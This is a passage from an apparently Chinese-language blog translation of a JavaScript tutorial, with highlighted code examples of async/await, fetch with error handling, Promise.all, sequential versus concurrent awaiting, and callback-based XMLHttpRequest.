class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span> &#125;;</span><br><span class="line">hello();</span><br></pre></td></tr></table></figure><p>该函数返回“Hello” —— 没什么特别的，对吧？</p><p>如果我们将其变成异步函数呢？请尝试以下方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span> &#125;;</span><br><span class="line">hello();</span><br></pre></td></tr></table></figure><p>哈。现在调用该函数会返回一个 <code>promise</code>。这是异步函数的特征之一 —— <strong>它保证函数的返回值为 promise</strong>。</p><p>你也可以创建一个异步函数表达式，如下所示:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hello = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span> &#125;;</span><br><span class="line">hello();</span><br></pre></td></tr></table></figure><p>你可以使用箭头函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hello = <span class="keyword">async</span> () =&gt; &#123; <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span> &#125;;</span><br></pre></td></tr></table></figure><p>这些都基本上是一样的。</p><p>要实际使用promise完成时返回的值，我们可以使用<code>.then()</code>块，因为它返回的是 promise：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello().then(<span class="function">(<span class="params">value</span>) =&gt;</span> <span class="built_in">console</span>.log(value))</span><br></pre></td></tr></table></figure><p>甚至只是简写如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello().then(<span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure><p>这就像我们在上一篇文章中看到的那样。</p><p>将 <code>async</code> 关键字加到函数申明中，可以告诉它们返回的是 <code>promise</code>，而不是直接返回值。此外，它<strong>避免了同步函数为支持使用 await 带来的任何潜在开销</strong>。在函数声明为 <code>async</code> 时，JavaScript引擎会添加必要的处理，以优化你的程序。爽！</p><h2 id="await"><a href="#await" class="headerlink" title="await"></a>await</h2><p>当 <code>await</code>关键字与异步函数一起使用时，它的真正优势就变得明显了 —— 事实上， <strong>await 只在异步函数里面才起作用</strong>。</p><p><strong>它可以放在任何异步的，基于 promise 的函数之前。它会暂停代码在该行上，直到 promise 完成，然后返回结果值</strong>。</p><p><strong>在暂停的同时，其他正在等待执行的代码就有机会执行了。</strong></p><p>您可以在调用任何返回Promise的函数时使用 <strong>await</strong>，包括Web API函数。</p><p>这是一个简单的示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> greeting = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">hello().then(alert);</span><br></pre></td></tr></table></figure><h2 id="使用-async-await-重写-promise-代码"><a href="#使用-async-await-重写-promise-代码" class="headerlink" title="使用 async/await 重写 promise 代码"></a>使用 async/await 重写 promise 代码</h2><p>让我们回顾一下我们在上一篇文章中简单的 fetch 示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>)</span><br><span class="line">.then(<span class="function"><span class="params">response</span> =&gt;</span> response.blob())</span><br><span class="line">.then(<span class="function"><span class="params">myBlob</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(myBlob);</span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;There has been a problem with your fetch operation: &#x27;</span> + e.message);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>到现在为止，你应该对 promises 及其工作方式有一个较好的理解。让我们将其转换为使用async / await看看它使事情变得简单了多少：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">myFetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="keyword">await</span> fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> myBlob = <span class="keyword">await</span> response.blob();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(myBlob);</span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myFetch()</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;There has been a problem with your fetch operation: &#x27;</span> + e.message);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>它使代码简单多了，更容易理解 —— 去除了到处都是 <code>.then()</code> 代码块！</p><p>由于 <code>async</code> 关键字将函数转换为 promise，您可以重构以上代码 —— 使用 promise 和 await 的混合方式，将函数的后半部分抽取到新代码块中。这样做可以更灵活：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">myFetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="keyword">await</span> fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> response.blob();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myFetch().then(<span class="function">(<span class="params">blob</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(blob);</span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="它到底是如何工作的？"><a href="#它到底是如何工作的？" class="headerlink" title="它到底是如何工作的？"></a>它到底是如何工作的？</h3><p>您会注意到我们已经将代码封装在函数中，并且我们在 <code>function</code> 关键字之前包含了 <code>async</code> 关键字。这是必要的 –– 您必须创建一个异步函数来定义一个代码块，在其中运行异步代码; await 只能在异步函数内部工作。</p><p>在<code>myFetch()</code>函数定义中，您可以看到代码与先前的 promise 版本非常相似，但存在一些差异。不需要附加 <code>.then()</code> 代码块到每个promise-based方法的结尾，你只需要在方法调用前添加 await 关键字，然后把结果赋给变量。<strong>await 关键字使JavaScript运行时暂停于此行，允许其他代码在此期间执行，直到异步函数调用返回其结果。</strong>一旦完成，您的代码将继续从下一行开始执行。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> response = <span class="keyword">await</span> fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>解析器会在此行上暂停，直到当服务器返回的响应变得可用时。此时 <code>fetch()</code> 返回的 promise 将会完成（fullfilled），返回的 response 会被赋值给 <code>response</code> 变量。一旦服务器返回的响应可用，解析器就会移动到下一行，从而创建一个<code>Blob</code>。Blob这行也调用基于异步promise的方法，因此我们也在此处使用<code>await</code>。当操作结果返回时，我们将它从<code>myFetch()</code>函数中返回。</p><p>这意味着当我们调用<code>myFetch()</code>函数时，它会返回一个promise，因此我们可以将<code>.then()</code>链接到它的末尾，在其中我们处理显示在屏幕上的<code>blob</code>。</p><p>你可能已经觉得“这真的很酷！”，你是对的 —— 用更少的.<code>then()</code>块来封装代码，同时它看起来很像同步代码，所以它非常直观。</p><h3 id="添加错误处理"><a href="#添加错误处理" class="headerlink" title="添加错误处理"></a>添加错误处理</h3><p>如果你想添加错误处理，你有几个选择。</p><p>您可以将同步的 <code>try...catch</code> 结构和 <code>async/await</code> 一起使用 。此示例扩展了我们上面展示的第一个版本代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">myFetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> response = <span class="keyword">await</span> fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> myBlob = <span class="keyword">await</span> response.blob();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> objectURL = URL.createObjectURL(myBlob);</span><br><span class="line">    <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    image.src = objectURL;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myFetch();</span><br></pre></td></tr></table></figure><p><code>catch() &#123;&#125;</code> 代码块会接收一个错误对象 <code>e</code> ; 我们现在可以将其记录到控制台，它将向我们提供详细的错误消息，显示错误被抛出的代码中的位置。</p><p>如果你想使用我们上面展示的第二个（重构）代码版本，你最好继续混合方式并将 <code>.catch()</code> 块链接到 <code>.then()</code> 调用的末尾，就像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">myFetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="keyword">await</span> fetch(<span class="string">&#x27;coffee.jpg&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> response.blob();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myFetch().then(<span class="function">(<span class="params">blob</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(blob);</span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function">(<span class="params">e</span>) =&gt;</span></span><br><span class="line">  <span class="built_in">console</span>.log(e)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这是因为 <code>.catch()</code> 块将捕获来自异步函数调用和promise链中的错误。如果您在此处使用了<code>try/catch</code> 代码块，则在调用 <code>myFetch()</code> 函数时，您仍可能会收到未处理的错误。</p><h2 id="等待Promise-all"><a href="#等待Promise-all" class="headerlink" title="等待Promise.all()"></a>等待Promise.all()</h2><p><code>async / await</code> 建立在 promises之上，因此它与promises提供的所有功能兼容。这包括<code>Promise.all()</code> –– 你完全可以通过调用 <code>await</code> <code>Promise.all()</code> 将所有结果返回到变量中，就像同步代码一样。</p><p>将其转换为 async / await，现在看起来像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchAndDecode</span>(<span class="params">url, type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="keyword">await</span> fetch(url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> content;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(type === <span class="string">&#x27;blob&#x27;</span>) &#123;</span><br><span class="line">    content = <span class="keyword">await</span> response.blob();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(type === <span class="string">&#x27;text&#x27;</span>) &#123;</span><br><span class="line">    content = <span class="keyword">await</span> response.text();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">displayContent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> coffee = fetchAndDecode(<span class="string">&#x27;coffee.jpg&#x27;</span>, <span class="string">&#x27;blob&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> tea = fetchAndDecode(<span class="string">&#x27;tea.jpg&#x27;</span>, <span class="string">&#x27;blob&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> description = fetchAndDecode(<span class="string">&#x27;description.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> values = <span class="keyword">await</span> <span class="built_in">Promise</span>.all([coffee, tea, description]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> objectURL1 = URL.createObjectURL(values[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">let</span> objectURL2 = URL.createObjectURL(values[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">let</span> descText = values[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> image1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> image2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image1.src = objectURL1;</span><br><span class="line">  image2.src = objectURL2;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image1);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> para = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">  para.textContent = descText;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(para);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">displayContent()</span><br><span class="line">.catch(<span class="function">(<span class="params">e</span>) =&gt;</span></span><br><span class="line">  <span class="built_in">console</span>.log(e)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>可以看到 <code>fetchAndDecode()</code> 函数只进行了一丁点的修改就转换成了异步函数。请看<code>Promise.all()</code> 行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> values = <span class="keyword">await</span> <span class="built_in">Promise</span>.all([coffee, tea, description]);</span><br></pre></td></tr></table></figure><p>在这里，通过使用<code>await</code>，我们能够在三个promise的结果都可用的时候，放入<code>values</code>数组中。这看起来非常像同步代码。我们需要将所有代码封装在一个新的异步函数<code>displayContent()</code> 中，尽管没有减少很多代码，但能够将大部分代码从 <code>.then()</code> 代码块移出，使代码得到了简化，更易读。</p><p>为了错误处理，我们在 <code>displayContent()</code> 调用中包含了一个 <code>.catch()</code> 代码块;这将处理两个函数中出现的错误。</p><h2 id="async-await的缺陷"><a href="#async-await的缺陷" class="headerlink" title="async/await的缺陷"></a>async/await的缺陷</h2><p>了解<code>Async/await</code>是非常有用的，但还有一些缺点需要考虑。</p><p><code>Async/await</code> 让你的代码看起来是同步的，在某种程度上，也使得它的行为更加地同步。 <code>await</code> 关键字<strong>会阻塞其后的代码</strong>，直到promise完成，就像执行同步操作一样。<strong>它确实可以允许其他任务在此期间继续运行，但您自己的代码被阻塞。</strong></p><p>这意味着您的代码可能会因为大量<code>await</code>的promises相继发生而变慢。每个<code>await</code>都会等待前一个完成，而你实际想要的是所有的这些promises同时开始处理（就像我们没有使用<code>async/await</code>时那样）。</p><p>有一种模式可以缓解这个问题——通过将 <code>Promise</code> 对象存储在变量中来同时开始它们，然后等待它们全部执行完毕。让我们看一些证明这个概念的例子。</p><p>我们有两个可用的例子 —— <a href="https://mdn.github.io/learning-area/javascript/asynchronous/async-await/slow-async-await.html">slow-async-await.html</a>和<a href="https://mdn.github.io/learning-area/javascript/asynchronous/async-await/fast-async-await.html">fast-async-await.html</a>。它们都以自定义promise函数开始，该函数使用<code>setTimeout()</code> 调用伪造异步进程：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeoutPromise</span>(<span class="params">interval</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      resolve(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">    &#125;, interval);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后每个包含一个 <code>timeTest()</code> 异步函数，等待三个 <code>timeoutPromise()</code> 调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">timeTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一个都以记录开始时间结束，查看 <code>timeTest()</code> promise 需要多长时间才能完成，然后记录结束时间并报告操作总共需要多长时间：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> startTime = <span class="built_in">Date</span>.now();</span><br><span class="line">timeTest().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> finishTime = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">let</span> timeTaken = finishTime - startTime;</span><br><span class="line">  alert(<span class="string">&quot;Time taken in milliseconds: &quot;</span> + timeTaken);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>timeTest()</code> 函数在每种情况下都不同。</p><p>在<a href="https://mdn.github.io/learning-area/javascript/asynchronous/async-await/slow-async-await.html">slow-async-await.html</a>示例中，<code>timeTest()</code> 如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">timeTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">await</span> timeoutPromise(<span class="number">3000</span>);</span><br><span class="line">  <span class="keyword">await</span> timeoutPromise(<span class="number">3000</span>);</span><br><span class="line">  <span class="keyword">await</span> timeoutPromise(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，我们直接等待所有三个timeoutPromise（）调用，使每个调用3秒钟。后续的每一个都被迫等到最后一个完成 - 如果你运行第一个例子，你会看到弹出框报告的总运行时间大约为9秒。</p><p>在<a href="https://mdn.github.io/learning-area/javascript/asynchronous/async-await/fast-async-await.html">fast-async-await.html</a>示例中，<code>timeTest()</code> 如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">timeTest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> timeoutPromise1 = timeoutPromise(<span class="number">3000</span>);</span><br><span class="line">  <span class="keyword">const</span> timeoutPromise2 = timeoutPromise(<span class="number">3000</span>);</span><br><span class="line">  <span class="keyword">const</span> timeoutPromise3 = timeoutPromise(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> timeoutPromise1;</span><br><span class="line">  <span class="keyword">await</span> timeoutPromise2;</span><br><span class="line">  <span class="keyword">await</span> timeoutPromise3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，<strong>我们将三个Promise对象存储在变量中，这样可以同时启动它们关联的进程。</strong></p><p>接下来，我们等待他们的结果 - 因为promise都在基本上同时开始处理，promise将同时完成;当您运行第二个示例时，您将看到弹出框报告总运行时间仅超过3秒！</p><p>您必须仔细测试您的代码，并在性能开始受损时牢记这一点。</p><p>另一个小小的不便是你必须将等待执行的promise封装在异步函数中。</p><h2 id="Async-await-的类方法"><a href="#Async-await-的类方法" class="headerlink" title="Async/await 的类方法"></a>Async/await 的类方法</h2><p>最后值得一提的是，我们可以在类/对象方法前面添加<code>async</code>，以使它们返回promises，并<code>await</code>它们内部的promises。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">first, last, age, gender, interests</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = &#123;</span><br><span class="line">      first,</span><br><span class="line">      last</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    <span class="built_in">this</span>.interests = interests;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="title">greeting</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(<span class="string">`Hi! I&#x27;m <span class="subst">$&#123;<span class="built_in">this</span>.name.first&#125;</span>`</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">farewell</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name.first&#125;</span> has left the building. Bye for now!`</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> han = <span class="keyword">new</span> Person(<span class="string">&#x27;Han&#x27;</span>, <span class="string">&#x27;Solo&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;male&#x27;</span>, [<span class="string">&#x27;Smuggling&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>第一个实例方法可以使用如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">han.greeting().then(<span class="built_in">console</span>.log);</span><br></pre></td></tr></table></figure><h1 id="选择正确的方法"><a href="#选择正确的方法" class="headerlink" title="选择正确的方法"></a>选择正确的方法</h1><h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2><p>通常在旧式API中找到，涉及将函数作为参数传递给另一个函数，然后在异步操作完成时调用该函数，以便回调可以依次对结果执行某些操作。这是promise的前身;它不那么高效或灵活。仅在必要时使用。</p><p>通过<code>XMLHttpRequest</code> API加载资源的示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadAsset</span>(<span class="params">url, type, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line">  xhr.responseType = type;</span><br><span class="line"></span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    callback(xhr.response);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayImage</span>(<span class="params">blob</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(blob);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadAsset(<span class="string">&#x27;coffee.jpg&#x27;</span>, <span class="string">&#x27;blob&#x27;</span>, displayImage);</span><br></pre></td></tr></table></figure><h3 id="缺陷"><a href="#缺陷" class="headerlink" 